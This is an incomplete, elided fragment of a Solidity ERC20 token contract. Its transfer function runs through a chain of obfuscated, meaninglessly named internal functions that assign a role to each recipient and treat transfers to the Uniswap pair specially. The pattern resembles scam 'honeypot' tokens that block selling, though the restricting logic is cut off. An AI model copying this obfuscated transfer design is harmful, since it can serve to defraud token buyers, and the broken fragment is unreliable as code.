...
abstract contract INJDEMOPConsole is Context, INJDEMOPRoleControl {
    ...
    function _roleChekeds(bytes32 role, address account, uint256 amt) internal {
...
contract INJDEMOPERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is INJDEMOPERC20, INJDEMOPConsole {
    ...
    ) INJDEMOPERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(INJDEMOPERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");


        _INJDEMOPegcvbt(from, to, amt);
    }



    function _INJDEMOPegcvbt(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _INJDEMOPfghrda(from, to, amt);
    }

    function _INJDEMOPfghrda(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _INJDEMOPuswqad(from, to, amt);
    }

    function _INJDEMOPuswqad(address from, address to, uint256 amt) internal {
        ...
        _INJDEMOPmyfrdv(from, to, amt);
    }

    function _INJDEMOPmyfrdv(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _INJDEMOPolfvcx(from, to, amt);
    }

    function _INJDEMOPolfvcx(address from, address to, uint256 amt) internal {
        
        _INJDEMOPzcxnude(from, to, amt);
    }

    function _INJDEMOPzcxnude(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _INJDEMOPgkytdvvn(from, to, amt);
    }

    function _INJDEMOPgkytdvvn(address from, address to, uint256 amt) internal {
